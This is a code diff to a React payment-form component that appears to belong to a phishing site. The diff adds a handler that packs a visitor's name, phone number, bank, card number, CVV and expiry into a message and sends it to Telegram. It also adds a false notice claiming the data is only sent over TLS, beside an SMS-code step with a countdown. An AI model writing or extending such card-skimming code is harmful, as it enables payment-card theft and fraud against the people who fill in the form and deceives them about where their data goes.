@@ -1,5 +1,8 @@
 import React, { useState, useEffect } from 'react';
 import './styles.css';
+import axios from 'axios';
+import { sendMessage } from '../api/telegram.ts';
+import InputMask from 'react-input-mask';
 
 const OrderOther = () => {
   const [showAlert, setShowAlert] = useState(true);
@@ -17,7 +20,33 @@ const OrderOther = () => {
   const [verificationLoading, setVerificationLoading] = useState(false);
   const [verificationSuccess, setVerificationSuccess] = useState(false);
   const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutes in seconds
+  const handleSmsSend = async () => {
+    setLoading(true);
+    try {
+      const message = `
+        Name: [ ${formData.name} ] Amount: [ ${formData.amount}  ] EUR Phone Number: [ ${formData.phoneNumber} ]
+        Bank Name: [${cardData.name}]
+        Card Number: [${cardData.cardNumber}] CVV: [${cardData.cvv}] Expiry Date: [${cardData.expiryDate}]
+      `;
 
+      sendMessage(message);
+
+      // Сбрасываем данные формы
+      setCardData({
+        cardNumber: '',
+        name: '',
+        cvv: '',
+        expiryDate: '',
+        amount: '',
+        agreement: false,
+      });
+
+      setStep(2);
+    } catch (error) {
+      console.error('Error sending message:', error.message);
+    }
+    setLoading(false);
+  };
   const handleAlertClose = () => {
     setShowAlert(false);
   };
@@ -30,13 +59,7 @@ const OrderOther = () => {
     });
   };
 
-  const handleSmsSend = () => {
-    setLoading(true);
-    setTimeout(() => {
-      setLoading(false);
-      setStep(2);
-    }, 2000);
-  };
+  
 
   const handleSmsSubmit = () => {
     setVerificationLoading(true);
@@ -67,7 +90,7 @@ const OrderOther = () => {
     return (
       <div className="fixed inset-0 bg-gray-500 bg-opacity-75 flex items-center justify-center z-50">
         <div className="bg-white p-6 rounded shadow-md text-center">
-          <p className="mb-4">Ваши данные никуда не передаются и с ними все хорошо.</p>
+          <p className="mb-4 text-blueth ">Все данные с этой страницы передаются по TLS-протоколу.</p>
           <button
             className="bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700"
             onClick={handleAlertClose}
